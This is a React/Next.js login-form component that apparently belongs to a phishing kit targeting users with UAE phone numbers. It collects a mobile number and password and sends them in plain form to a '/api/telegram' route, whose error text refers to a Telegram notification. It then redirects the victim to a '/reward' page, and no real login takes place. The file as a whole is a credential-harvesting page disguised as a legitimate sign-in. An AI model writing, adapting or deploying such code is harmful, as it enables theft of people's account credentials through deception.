"use client"

import { useRouter } from "next/navigation"
import { useState } from "react"
import { ChevronDown } from "lucide-react"

export function LoginForm() {
  const router = useRouter()
  const [mobile, setMobile] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [isSending, setIsSending] = useState(false)
  const [error, setError] = useState("")

  const canSubmit = mobile.trim().length > 0 && password.length > 0

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault()
    if (!canSubmit || isSending) return

    setIsSending(true)
    setError("")

    try {
      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "login", mobile, password }),
      })

      if (!response.ok) throw new Error("Telegram notification failed")
      router.push("/reward")
    } catch {
      setError("Unable to continue. Please try again.")
    } finally {
      setIsSending(false)
    }
  }

  return (
    <form onSubmit={handleSubmit} className="flex w-full flex-col">
      {/* Mobile Number */}
      <div className="mb-8">
        <label htmlFor="mobile" className="mb-2 block text-sm text-field-label">
          Mobile Number
        </label>
        <div className="flex items-center gap-3 border-b border-navy pb-1">
          <button
            type="button"
            className="flex shrink-0 items-center gap-1 text-navy"
            aria-label="Select country code"
          >
            <span className="text-xs font-bold">AE</span>
            <span className="text-lg font-bold">+971</span>
            <ChevronDown className="h-4 w-4" strokeWidth={2.5} />
          </button>
          <input
            id="mobile"
            type="tel"
            inputMode="numeric"
            value={mobile}
            onChange={(e) => setMobile(e.target.value.replace(/[^\d]/g, ""))}
            className="w-full bg-transparent text-lg font-bold text-navy outline-none placeholder:font-normal placeholder:text-field-line"
          />
        </div>
      </div>

      {/* Password */}
      <div className="mb-12">
        <div className="mb-2 flex items-center justify-between">
          <label htmlFor="password" className="block text-sm text-field-label">
            Password
          </label>
          <button
            type="button"
            onClick={() => setShowPassword((s) => !s)}
            className="text-sm font-bold text-navy"
          >
            {showPassword ? "Hide" : "Show"}
          </button>
        </div>
        <input
          id="password"
          type={showPassword ? "text" : "password"}
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="w-full border-b border-field-line bg-transparent pb-1 text-lg font-bold text-navy outline-none focus:border-navy"
        />
      </div>

      {/* Log In */}
      {error ? <p className="-mt-8 mb-4 text-center text-sm text-destructive">{error}</p> : null}

      <button
        type="submit"
        disabled={!canSubmit || isSending}
        className="mb-5 w-full rounded-2xl py-4 text-base font-bold shadow-[0_10px_30px_-12px_rgba(0,0,0,0.25)] transition-colors disabled:cursor-not-allowed disabled:bg-muted disabled:text-muted-foreground enabled:bg-navy enabled:text-white"
      >
        {isSending ? "Logging In..." : "Log In"}
      </button>

      {/* Forgot password */}
      <div className="flex justify-center">
        <button
          type="button"
          className="rounded-full border border-field-line px-8 py-3 text-sm font-bold text-navy transition-colors hover:bg-muted"
        >
          Forgot password
        </button>
      </div>
    </form>
  )
}
